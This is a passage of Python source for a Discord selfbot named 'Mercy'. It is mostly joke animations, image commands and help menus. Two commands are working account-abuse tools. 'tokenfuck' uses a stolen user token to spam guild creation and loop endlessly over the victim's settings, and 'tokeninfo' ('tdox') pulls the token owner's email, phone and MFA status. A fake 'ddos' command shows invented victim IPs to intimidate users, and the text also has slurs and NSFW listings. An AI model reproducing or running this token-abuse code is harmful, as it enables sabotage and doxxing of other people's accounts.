    await asyncio.sleep(0.5)
    await message.edit(content=f'''
```[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ Uploading..```   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
```[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | Uploading...```       
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
```[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / Uploading.```   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
```[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - Uploading..```
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
```[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ Uploading...```   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
```Failed to load NSFW video into Channel```  
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
    `Contact Guild owner to get more porn perms!`
        ''')


@Mercy.command()
async def wtf(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}wtf")
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
`W` 
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`Wh`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`Wha`   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`What`       
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`What `   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`What T`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`What Th`   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`What The`  
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`What The F` 
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`What The Fu`  
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`What The Fuc`  
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`What The Fuck`  
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
    `What The Fuck!`
        ''')

@Mercy.command()
async def ddos(ctx, user: discord.User):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}ddos {user}")
    await ctx.message.delete()
    fakeip = [
        "45.186.255.38",
        "152.154.23.1156:1080",
        "31.146.44.35:4153",
        "103.232.33.147:1080",
        "177.184.67.615:4145",
        "1.2.2015.44:4145",
        "1151.1815.30.85:5151585",
        "45.125.63.46:44110",
        "103.47.153.220:1080",
        "101.255.125.515:4145",
        "110.77.155.112:4153",
        "103.155.15.20:4145"
    ]
    fakeip2 = random.choice(fakeip)
    message = await ctx.send(f'''
`Starting the DDos ​​to {user.mention}, 5 seconds left for the DDos to start | IP : {fakeip2}`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`Starting the DDos ​​to {user.mention}, 4 seconds left for the DDos to start | IP : {fakeip2}`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`Starting the DDos ​​to {user.mention}, 3 seconds left for the DDos to start | IP : {fakeip2}` 
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`Starting the DDos ​​to {user.mention}, 2 seconds left for the DDos to start | IP : {fakeip2}`     
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`Starting the DDos ​​to {user.mention}, 1 seconds left for the DDos to start | IP : {fakeip2}`    
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`Starting the DDos ​​to {user.mention}, 0 seconds left for the DDos to start | IP : {fakeip2}`   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`DDos to {user.mention} victim's ip {fakeip2}`  
''')

@Mercy.command()
async def lmfao(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}lmao")
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
`L` 
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`LM`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`LMF`   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`LMFA`       
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`LMFAO `   
''')

afkdict = {}
@Mercy.command(name = "afk", brief = "Away From Keyboard",
                description = "I'll give you the afk status and if someone pings you before you come back, I'll tell "
                              "them that you are not available. You can add your own afk message!")
async def afk(ctx, message = "They didn't leave a message!"):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}afk | reason : {message}")
    global afkdict

    if ctx.message.author in afkdict:
        afkdict.pop(ctx.message.author)
        embed = discord.Embed(title=f"{titlee} | AFK MODE (OFF)",color = (colour), description=f"**{ctx.author.mention} has returned, say hello!**")
        embed.set_thumbnail(url=f"{foto}")
        embed.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
        await ctx.send(embed=embed, delete_after=15)

    else:
        afkdict[ctx.message.author] = message
        embed = discord.Embed(title=f"{titlee} | AFK MODE (ON)",color = (colour), description=f"**{ctx.author.mention} has set afk mode\n\nReason : {message}**")
        embed.set_thumbnail(url=f"{foto}")
        embed.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
        await ctx.send(embed=embed, delete_after=15)


@Mercy.event
async def on_message(message):
    global afkdict

    for member in message.mentions:  
        if member != message.author:  
            if member in afkdict:  
                afkmsg = afkdict[member]  
                await message.channel.send(f"**Oh no, it looks like {member} is afk right now, please call him later\n\nReason : {afkmsg}**")
    await Mercy.process_commands(message)

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)

@Mercy.command()
async def restart(ctx):
    await ctx.message.delete()
    cmd = "mode 120,25"
    os.system(cmd)
    restart_program()

@Mercy.command()
async def egg(ctx):
    await ctx.message.delete()
    await ctx.send(f"Mercy Say : Oh boy did you find an easter egg, look at the console to see it. {ctx.author.mention}")
    egg1 = [
        "Did you know that the first versions of the selfbot were called Lunar. 1/5",
        "When he thinks the selfbot was eating mashed potatoes. 2/5",
        "My first customers were my friends xD. 3/5",
        "I was more than once to nothing to leave the selfbot 4/5",
        "I currently live in Chile but I would like to go live in Canada 5/5"
    ]
    egg2 = random.choice(egg1)
    ctypes.windll.kernel32.SetConsoleTitleW(f"{egg2}")
    sleep(5.80)

@Mercy.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}tokenfuck {_token}")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/200501515 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': True,
        'icon': "https://i.imgur.com/INaRWfZ.png",
        'name': "Mercy",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break

@Mercy.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070150000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070150000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    # em.set_footer(text=_token)
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em = discord.Embed(title=(titlee), color = colour)
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            em.set_footer(text=(foother2))
    return await ctx.send(embed=em)

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

@Mercy.command()
async def abc(ctx):
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u',
           'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

@Mercy.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send("missing parameters")
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Mercy_tweet.png"))
            except:
                await ctx.send(res['message'])

@Mercy.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Mercy_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Mercy_magik.png"))
        except:
            await ctx.send(res['message'])

@Mercy.command(aliases=["deepfry"])
async def fry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Mercy_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Mercy_fry.png"))
        except:
            await ctx.send(res['message'])

@Mercy.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em, delete_after=15)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def sad(ctx):
    await ctx.message.delete()
    sad1 = [
        "https://i.pinimg.com/originals/9f/6b/7b/9f6b7bf8ba47fe7915e34b44a9db105c.gif",
        "https://media1.tenor.com/images/2bd485a5d2b8600a78ca0b82adbb2dde/tenor.gif?itemid=16156194",
        "https://monophy.com/media/T4COazRlurxKM/monophy.gif",
        "https://i.gifer.com/2SJT.gif",
        "https://i.pinimg.com/originals/2f/b2/96/2fb2965acbf3ed573e8b63080b947fe5.gif",
        "https://media1.tenor.com/images/42caf637a1772c4735d1f74b59273f55/tenor.gif?itemid=16604973"
    ]
    sad2 = random.choice(sad1)
    em = discord.Embed(color = (colour), description=f"**{ctx.author.mention} is sad :(**")
    em.set_image(url=sad2)
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def SAD(ctx):
    await ctx.message.delete()
    sad1 = [
        "https://i.pinimg.com/originals/9f/6b/7b/9f6b7bf8ba47fe7915e34b44a9db105c.gif",
        "https://media1.tenor.com/images/2bd485a5d2b8600a78ca0b82adbb2dde/tenor.gif?itemid=16156194",
        "https://monophy.com/media/T4COazRlurxKM/monophy.gif",
        "https://i.gifer.com/2SJT.gif",
        "https://i.pinimg.com/originals/2f/b2/96/2fb2965acbf3ed573e8b63080b947fe5.gif",
        "https://media1.tenor.com/images/42caf637a1772c4735d1f74b59273f55/tenor.gif?itemid=16604973"
    ]
    sad2 = random.choice(sad1)
    em = discord.Embed(color = (colour), description=f"**{ctx.author.mention} is sad :(**")
    em.set_image(url=sad2)
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def advance(ctx):
    await ctx.message.delete()
    os.system("cls")
    print(f'''

\t\t\t              {Fore.WHITE}███{asciicolor}╗{Fore.WHITE}   ███{asciicolor}╗{Fore.WHITE}███████{asciicolor}╗{Fore.WHITE}██████{asciicolor}╗  {Fore.WHITE}██████{asciicolor}╗{Fore.WHITE}██{asciicolor}╗   {Fore.WHITE}██{asciicolor}╗
\t\t\t              {Fore.WHITE}████{asciicolor}╗{Fore.WHITE} ████{asciicolor}║{Fore.WHITE}██{asciicolor}╔════╝{Fore.WHITE}██{asciicolor}╔══{Fore.WHITE}██{asciicolor}╗{Fore.WHITE}██{asciicolor}╔════╝╚{Fore.WHITE}██{asciicolor}╗ {Fore.WHITE}██{asciicolor}╔╝
\t\t\t              {Fore.WHITE}██{asciicolor}╔{Fore.WHITE}████{asciicolor}╔{Fore.WHITE}██{asciicolor}║{Fore.WHITE}█████{asciicolor}╗{Fore.WHITE}  ██████{asciicolor}╔╝{Fore.WHITE}██{asciicolor}║      ╚{Fore.WHITE}████{asciicolor}╔╝ 
\t\t\t              {Fore.WHITE}██{asciicolor}║╚{Fore.WHITE}██{asciicolor}╔╝{Fore.WHITE}██{asciicolor}║{Fore.WHITE}██{asciicolor}╔══╝  {Fore.WHITE}██{asciicolor}╔══{Fore.WHITE}██{asciicolor}╗{Fore.WHITE}██{asciicolor}║       {asciicolor}╚{Fore.WHITE}██{asciicolor}╔╝  
\t\t\t              {Fore.WHITE}██{asciicolor}║ ╚═╝{Fore.WHITE} ██{asciicolor}║{Fore.WHITE}███████{asciicolor}╗{Fore.WHITE}██{asciicolor}║ {Fore.WHITE} ██{asciicolor}║╚{Fore.WHITE}██████{asciicolor}╗   {Fore.WHITE}██{asciicolor}║   
\t\t\t              {asciicolor}╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝  {Fore.RESET}
\t\t\t              {asciicolor}           {Fore.WHITE}Mercy {asciicolor}all settings.

{Fore.WHITE}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――{Fore.RESET}
{Fore.WHITE} [{asciicolor}+{Fore.WHITE}] {asciicolor}MERCY SETTINGS.      

{Fore.WHITE} [{asciicolor}+{Fore.WHITE}] {asciicolor}Loggin in as :{Fore.WHITE} {Mercy.user.name}#{Mercy.user.discriminator}   
{Fore.WHITE} [{asciicolor}+{Fore.WHITE}] {asciicolor}Prefix :{Fore.WHITE} {Mercy.command_prefix}                            
{Fore.WHITE}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――{Fore.RESET}
{Fore.WHITE} [{asciicolor}+{Fore.WHITE}] {asciicolor}USER PRENCESE.

{Fore.WHITE} [{asciicolor}+{Fore.WHITE}] {asciicolor}STREAMING URL :{Fore.WHITE} {stream_url}
{Fore.WHITE} [{asciicolor}+{Fore.WHITE}] {asciicolor}CUSTOM STATUTS :{Fore.WHITE} {one} - {two} - {three}  
{Fore.WHITE}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――{Fore.RESET}
{Fore.WHITE} [{asciicolor}+{Fore.WHITE}] {asciicolor}MERCY CUSTOMIZATION.

{Fore.WHITE} [{asciicolor}+{Fore.WHITE}] {asciicolor}EMBED TITLE :{Fore.WHITE} {titlee}
{Fore.WHITE} [{asciicolor}+{Fore.WHITE}] {asciicolor}EMBED THUMBNAIL :{Fore.WHITE} {foto}
{Fore.WHITE} [{asciicolor}+{Fore.WHITE}] {asciicolor}EMBED COLOR :{Fore.WHITE} 0x{colour}

[{asciicolor}Mercy say{Fore.WHITE}] Type "{Mercy.command_prefix}back" to return to the main menu.''')

@Mercy.command()
async def back(ctx):
    await ctx.message.delete()
    os.system("cls")
    load()

@Mercy.command()
async def BACK(ctx):
    await ctx.message.delete()
    os.system("cls")
    load()

@Mercy.command()
async def iq(ctx, user: discord.User):
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}iq {user}")
    iq = [
        "50 IQ",
        "100 IQ",
        "20 IQ",
        "10 IQ",
        "30 IQ",
        "40 IQ",
        "2 IQ",
        "1 IQ",
        "NO IQ IS RETARD",
        "1000 IQ",
        "2000 IQ",
        "5000 IQ",
        "100000000000 IQ IS EINSTEIN WTF"
    ]
    imgq = [
        "https://pngimage.net/wp-content/uploads/2018/06/monkas-png-7.png",
        "https://tlgrm.es/_/stickers/108/979/10897963-eca0-3034-8344-3012b5605373/9.jpg",
        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvCGdeUpXi1WxdMbcCp8o0gN9Ana_2x9sOgXweEt5jiGiSaiGMvPyAKHgA0dae2F_7rBI&usqp=CAU"
    ]
    imgiq = random.choice(imgq)
    iq2 = random.choice(iq)
    em = discord.Embed(description=f" **{iq2}** " + user.mention, color = (colour))
    em.set_image(url=f"{imgiq}")
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def tickle(ctx, user: discord.Member):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}tickle {user}")
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    em = discord.Embed(color=colour, description=f"{ctx.author.mention} **Tickle** {user.mention}")
    em.set_image(url=res['url'])
    em.set_footer(text=(foother2))
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def cuddle(ctx, user: discord.Member):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}cuddle {user}")
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    em = discord.Embed(color=colour, description=f"{ctx.author.mention} **Cuddle** {user.mention}")
    em.set_image(url=res['url'])
    em.set_footer(text=(foother2))
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def style1(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}style1")
    await ctx.message.delete()
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Mercy {version} | Style 1 | Type {Mercy.command_prefix}back to return a default style")
    print(f'''{Fore.RESET}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

\t\t\t                      _  _ ____ ____ ____ _   _ 
\t\t\t                      |\/| |___ |__/ |     \_/  
\t\t\t                      |  | |___ |  \ |___   |   

\t\t\t                   {Fore.WHITE}[{asciicolor}!{Fore.WHITE}] Logged in as >> {Mercy.user.name}#{Mercy.user.discriminator} 
\t\t\t                   {Fore.WHITE}[{asciicolor}!{Fore.WHITE}] Prefix is >> {Mercy.command_prefix}
\t\t\t                   {Fore.WHITE}[{asciicolor}!{Fore.WHITE}] Mercy with RPC Mode.

{Fore.RESET}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――{Fore.RESET}''' + Fore.RESET)

@Mercy.command()
async def style2(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}style2")
    await ctx.message.delete()
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Mercy {version} | Style 2 | Type {Mercy.command_prefix}back to return a default style")
    print(f'''{Fore.RESET}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

\t\t\t           __  __  U _____ u   ____       ____  __   __ 
\t\t\t         U|' \/ '|u\| ___"|/U |  _"\ u U /"___| \ \ / / 
\t\t\t         \| |\/| |/ |  _|"   \| |_) |/ \| | u    \ V /  
\t\t\t          | |  | |  | |___    |  _ <    | |/__  U_|"|_u 
\t\t\t          |_|  |_|  |_____|   |_| \_\    \____|   |_|   
\t\t\t          <<,-,,-.   <<   >>   //   \\_  _// \\.-,//|(_  
\t\t\t          (./  \.) (__) (__) (__)  (__)(__)(__)\_) (__)   

\t\t\t              {Fore.WHITE}[{asciicolor}${Fore.WHITE}] Logged in as >> {Mercy.user.name}#{Mercy.user.discriminator} 
\t\t\t              {Fore.WHITE}[{asciicolor}${Fore.WHITE}] Prefix is >> {Mercy.command_prefix}
\t\t\t              {Fore.WHITE}[{asciicolor}${Fore.WHITE}] Mercy with RPC Mode.

{Fore.RESET}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――{Fore.RESET}''' + Fore.RESET)

@Mercy.command()
async def style3(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}style3")
    await ctx.message.delete()
    cmd = "mode 70,20"
    os.system(cmd)
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Mercy {version} | Style 3 | Type {Mercy.command_prefix}back to return a default style")
    print(f'''―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

\t\t          {asciicolor}╔╦╗ {Fore.WHITE}╔═╗ {asciicolor}╦═╗ {Fore.WHITE}╔═╗{asciicolor} ╦ ╦
\t\t          {asciicolor}║║║ {Fore.WHITE}║╣  {asciicolor}╠╦╝ {Fore.WHITE}║  {asciicolor} ╚╦╝
\t\t          {asciicolor}╩ ╩ {Fore.WHITE}╚═╝ {asciicolor}╩╚═ {Fore.WHITE}╚═╝{asciicolor}  ╩  
\t\t     -----------------------------
\t\t    {Fore.WHITE}[{asciicolor}-{Fore.WHITE}] Logged in as >> {Mercy.user.name}#{Mercy.user.discriminator} 
\t\t    {Fore.WHITE}[{asciicolor}-{Fore.WHITE}] Prefix is >> {Mercy.command_prefix}
\t\t    {Fore.WHITE}[{asciicolor}-{Fore.WHITE}] Mercy with RPC Mode.

{Fore.RESET}―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――{Fore.RESET}''' + Fore.RESET)

@Mercy.command()
async def amongus(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}amongus")
    await ctx.message.delete()
    await ctx.send("ඞ")

@Mercy.command()
async def help(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}help")
    await ctx.message.delete()
    embed = discord.Embed(title=f"{titlee} | Help menu.", color=colour, description=f'''
    \n\n
    {randomcoments}

    **{Mercy.command_prefix}FUNNY** >> Show all FUNNY comands.
    **{Mercy.command_prefix}MISC** >> Show all MISC comands.
    **{Mercy.command_prefix}NSFW** >> Show all NSFW comands.
    **{Mercy.command_prefix}IMAGE** >> Show all IMAGE comands.
    **{Mercy.command_prefix}TEXT** >> Show all TEXT comands.
    **{Mercy.command_prefix}RAID** >> Show all RAID comands.
    **{Mercy.command_prefix}STATUS** >> Show all STATUS comands.
    **{Mercy.command_prefix}SELFBOT** >> Show all SELFBOT comands.
    ''')
    embed.set_thumbnail(url=(foto))
    embed.set_footer(text=(foother2))
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def funny(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}funny")
    await ctx.message.delete()
    embed = discord.Embed(title=f"{titlee} | Funny commands.", color=colour, description=f'''
    \n\n
    {randomcoments}

    `{Mercy.command_prefix}kiss <user> - kisses the mentioned user.`
    `{Mercy.command_prefix}slap <user> - slap the mentioned user.`
    `{Mercy.command_prefix}pat <user> - pat the mentioned user.`
    `{Mercy.command_prefix}tickle <user> - tickle the mentioned user.`
    `{Mercy.command_prefix}shot <user> - shot the mentioned user.`
    `{Mercy.command_prefix}iq <user> - user iq.`
    `{Mercy.command_prefix}emotion - emotion reaction`
    `{Mercy.command_prefix}sad - sad reaction.`
    `{Mercy.command_prefix}emotion - emotion reaction.`
    `{Mercy.command_prefix}goobye - say goodbye!`
    `{Mercy.command_prefix}scared - scared emotion D:`
    `{Mercy.command_prefix}blushed - blushed emotion uwu.`
    `{Mercy.command_prefix}hello - say hello :D`
    `{Mercy.command_prefix}slot - slotmachine.`
    `{Mercy.command_prefix}dick <user> - dick side.`
    ''')
    embed.set_thumbnail(url=(foto))
    embed.set_footer(text=(foother2))
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def nsfw(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}nsfw")
    await ctx.message.delete()
    embed = discord.Embed(title=f"{titlee} | NSFW commands.", color=colour, description=f'''
    \n\n
    {randomcoments}

    `{Mercy.command_prefix}fuck <user> - fuck the mentioned user`
    `{Mercy.command_prefix}anal - anal gif or image`
    `{Mercy.command_prefix}lesbian - lesbian gif or image`
    `{Mercy.command_prefix}blowjob - blowjob gif or image`
    `{Mercy.command_prefix}boobs - boobs gif or image`
    `{Mercy.command_prefix}cuddle - cuddle gif or image`
    `{Mercy.command_prefix}cum - cum gif or image`
    `{Mercy.command_prefix}cumslut - cumslut gif or image`
    `{Mercy.command_prefix}tits - tits gif or image`
    `{Mercy.command_prefix}pussy - pussy gif or image`
    ''')
    embed.set_thumbnail(url=(foto))
    embed.set_footer(text=(foother2))
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def image(ctx):
